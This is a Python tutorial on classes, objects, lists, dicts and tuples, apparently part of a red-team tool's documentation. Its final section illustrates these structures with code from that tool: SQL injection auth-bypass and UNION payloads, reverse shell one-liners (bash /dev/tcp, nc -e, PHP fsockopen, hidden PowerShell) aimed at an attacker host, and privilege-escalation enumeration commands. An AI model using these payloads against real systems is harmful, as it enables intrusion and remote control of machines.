# Python Mental Model: Classes, Objects, and Data Structures

## Overview

This guide provides a practical mental model for understanding Python's core concepts:

* **Class** → design / schematic
* **Object** → running component / instance of that design

This document explains how `list`, `dict`, and `tuple` fit into this model and when to use each in your projects.

---

## 1. Lists, Dicts, and Tuples Are Classes

Under the hood:

```python
type([]) is list   # True
type({}) is dict   # True
type(()) is tuple  # True
```

So:

* `list`, `dict`, `tuple` are **built-in classes**.
* Any `[]`, `{}`, `()` you create are **objects/instances** of those classes.

In blueprint → component terms:

* `list` is the **design** of a dynamic sequence component.
* `dict` is the **design** of a key-value store component.
* `tuple` is the **design** of an immutable fixed-shape container.

The key insight isn't "are they classes?" (they are), it's **how they fit into your architecture** compared to *your* classes.

---

## 2. Role Mapping: How to Think of Each in a System

Use hardware-ish metaphors:

### `list` → Ordered Bus / Queue

* **Properties**: ordered, mutable, indexable, resizable.
* Think: work queue, event stream, ordered pipeline of tasks.

Example role:

```python
tasks = []  # list object: runtime queue

class TaskRunner:
    def add_task(self, task):
        tasks.append(task)   # wiring tasks into the queue
```

Architecture-wise:
Your class is the module that *uses* a list as its internal bus for "many of the same thing."

---

### `dict` → Addressable Memory / Registry

* **Properties**: key → value mapping, fast lookup, mutable.
* Think: configuration store, routing table, registry of components.

Example role:

```python
handlers = {}  # dict object: runtime registry

class Router:
    def register(self, name, handler):
        handlers[name] = handler

    def dispatch(self, name, *args, **kwargs):
        return handlers[name](*args, **kwargs)
```

Here:

* `Router` is the **design**.
* Each `Router()` object is a running component.
* Inside it, the `dict` object is a **lookup table** wiring names → handler objects.

---

### `tuple` → Fixed Pinout / Snapshot

* **Properties**: ordered, **immutable**, fixed length.
* Think: a record/coordinate, or a frozen snapshot of some state.

Example role:

```python
position = (10, 20)  # tuple as coordinate
state_snapshot = (user_id, is_active, last_login)
```

Tuples are best when:

* The structure is small and stable.
* You want "once created, it doesn't change."
* Order has meaning: `(x, y)`, not `{"x": x, "y": y}`.

---

## 3. When to Use: Class vs List vs Dict vs Tuple

Here's a practical decision table for your projects.

### Use a **class** (often a `dataclass`) when:

* The thing has a **clear name in your domain**: `User`, `Order`, `ScanResult`.
* It has **behavior or invariants**: methods, validation, computed properties.
* You expect the concept to **evolve** with logic over time.

```python
from dataclasses import dataclass, field

@dataclass
class Order:
    items: list  # list of LineItems
    status: str = "pending"

    def total(self):
        return sum(item.price for item in self.items)
```

Here `Order` is your domain design, `items` is a *list object* acting as its internal bus.

---

### Use a **list** when:

* You have **many items of the same type/role**.
* The order matters or you'll iterate a lot.
* Example: events, tasks, records, sensor readings.

```python
events: list[Event] = []
```

---

### Use a **dict** when:

* You need **named access**: config keys, IDs, labels.
* You're modeling something JSON-like.
* You need to look things up **by key** quickly.

```python
users_by_id: dict[int, User] = {}
config: dict[str, str] = {}
```

When a dict's shape stabilizes and gains meaning, that's usually a sign:
"turn me into a class / dataclass."

---

### Use a **tuple** when:

* You just need to glue a couple values together **temporarily**.
* You're returning multiple values from a function.
* The structure is small, positionally meaningful, and not going to change shape.

```python
def compute_stats(numbers: list[int]) -> tuple[float, float, float]:
    mean = sum(numbers) / len(numbers)
    mn = min(numbers)
    mx = max(numbers)
    return mean, mn, mx  # tuple
```

If you start doing `stats[0]`, `stats[1]` everywhere, consider:

* `collections.namedtuple`
* or just a `@dataclass` with fields `mean`, `min`, `max`.

---

## 4. Integrating into Your Project Structure

Think in layers:

### Layer 1: Domain Designs → Your Classes

These describe **what the system *is***.

```python
from dataclasses import dataclass

@dataclass
class Host:
    name: str
    ip: str
    roles: list[str]

@dataclass
class ScanResult:
    host: Host
    open_ports: list[int]
    metadata: dict[str, str]
```

Here:

* `Host`, `ScanResult` are **designs** (classes).
* Instances of them are **running domain components**.
* Inside them:

  * `list[int]` = internal sequences (ports, roles).
  * `dict[str, str]` = flexible metadata / tags.

---

### Layer 2: Wiring & Orchestration → Containers of Components

Here `list` and `dict` manage *many* domain objects.

```python
class ScanManager:
    def __init__(self):
        self.hosts: dict[str, Host] = {}   # name → Host
        self.queue: list[Host] = []        # scan queue

    def add_host(self, host: Host):
        self.hosts[host.name] = host
        self.queue.append(host)

    def next_batch(self, size: int) -> list[Host]:
        batch = self.queue[:size]
        self.queue = self.queue[size:]
        return batch
```

Conceptual roles:

* `ScanManager` = design for orchestration module.
* `hosts` dict = **registry** of host components.
* `queue` list = **work queue** of host components.

---

### Layer 3: Snapshots & Return Values → Tuples

Use tuples at edges where a tiny, immutable pack is convenient.

```python
def summarize_scan(result: ScanResult) -> tuple[int, int]:
    """Return (open_port_count, metadata_count)."""
    return len(result.open_ports), len(result.metadata)
```

If that pair becomes semantically important, promote:

```python
@dataclass(frozen=True)
class ScanSummary:
    open_ports: int
    metadata_count: int
```

This is a nice pattern:

* **Prototype** with tuples/dicts.
* When shapes reoccur and gain meaning, **promote** them to classes.

---

## 5. Quick Decision Rule

As you work on your projects, keep this mental check:

1. **Is this thing part of my domain language?**

   * Yes → make it a class/dataclass.

2. **Is this thing just a way to hold many of those domain objects?**

   * Yes → it's probably a `list` or `dict` inside a class.

3. **Is this thing a tiny, throwaway bundle of values?**

   * Yes → use a `tuple` (and maybe later upgrade it).

That way:

* Classes are your **semantic designs**.
* Objects are **running units** of meaning.
* Lists/dicts/tuples are **data-structure plumbing** between and inside them, like buses, tables, and snapshots.

Once you see it that way, containers stop competing with classes and just become part of the system's wiring diagram.

---

## 6. Red Team MCP Examples

Here are examples from this codebase demonstrating these patterns:

### Domain Classes (from `src/models.py`)

The codebase uses Pydantic models with validation, demonstrating classes as domain designs:

```python
from pydantic import BaseModel, Field, field_validator, ConfigDict
from enum import Enum

class ShellType(str, Enum):
    """Reverse shell types - an Enum class defining allowed values."""
    BASH = "bash"
    PYTHON = "python"
    PHP = "php"
    POWERSHELL = "powershell"

class ReverseShellInput(BaseModel):
    """Input model for reverse shell generation - a domain design with validation."""
    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra='forbid'
    )

    shell_type: ShellType = Field(
        ...,
        description="Type of reverse shell to generate"
    )
    lhost: str = Field(
        ...,
        description="Attacker's IP address",
        min_length=7,
        max_length=45
    )
    lport: int = Field(
        ...,
        description="Listening port on attacker machine",
        ge=1,
        le=65535
    )
    encode: bool = Field(
        default=False,
        description="Base64 encode the payload"
    )
```

### List as Collection for Iteration (from `src/payloads.py`)

Lists hold items that will be processed uniformly - here, SQL injection payloads:

```python
def generate_sqli_payloads(
    self,
    injection_type: str,
    columns: Optional[int] = None,
    database: str = "mysql"
) -> str:
    payloads = []  # list will hold payloads for this injection type

    if injection_type == "auth_bypass":
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' OR 1=1--",
            "') OR ('1'='1",
        ]
    elif injection_type == "union_based":
        cols = columns or 3
        payloads = [
            f"' UNION SELECT {','.join(['NULL']*cols)}--",
            f"' UNION SELECT {','.join([str(i) for i in range(1, cols+1)])}--",
        ]
    
    # List is iterated to build output
    for i, payload in enumerate(payloads, 1):
        output += f"{i}. `{payload}`\n"
```

### Dict as Lookup Registry (from `src/payloads.py`)

Dicts provide fast key-based access - here, shell type → payload template:

```python
def generate_reverse_shell(
    self,
    shell_type: str,
    lhost: str,
    lport: int,
    encode: bool = False
) -> str:
    # Dict as registry mapping shell types to payload templates
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(...)'",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh...\");'",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...",
        "netcat": f"nc -e /bin/sh {lhost} {lport}",
    }
    
    # Fast lookup by key with fallback
    payload = payloads.get(shell_type, payloads["bash"])
```

### Tuple as Grouped Values (from `src/payloads.py`)

Tuples group related values that belong together - here, (title, command) pairs:

```python
def generate_privesc_enum(self, target_os: str, check_type: str) -> str:
    commands = []  # list of tuples: each tuple is (title, command)
    
    if target_os == "linux":
        if check_type in ["all", "quick"]:
            commands.extend([
                ("System Info", "uname -a; cat /etc/*-release"),
                ("Current User", "id; whoami"),
                ("Sudo Rights", "sudo -l"),
            ])
        if check_type in ["all", "suid"]:
            commands.extend([
                ("SUID Binaries", "find / -perm -4000 -type f 2>/dev/null"),
                ("SGID Binaries", "find / -perm -2000 -type f 2>/dev/null"),
            ])
    
    # Tuples unpacked during iteration
    for title, cmd in commands:
        output += f"### {title}\n```bash\n{cmd}\n```\n\n"
```

---

## References

* [Python Data Model](https://docs.python.org/3/reference/datamodel.html)
* [PEP 557 – Data Classes](https://peps.python.org/pep-0557/)
* [Python Type Hints](https://docs.python.org/3/library/typing.html)
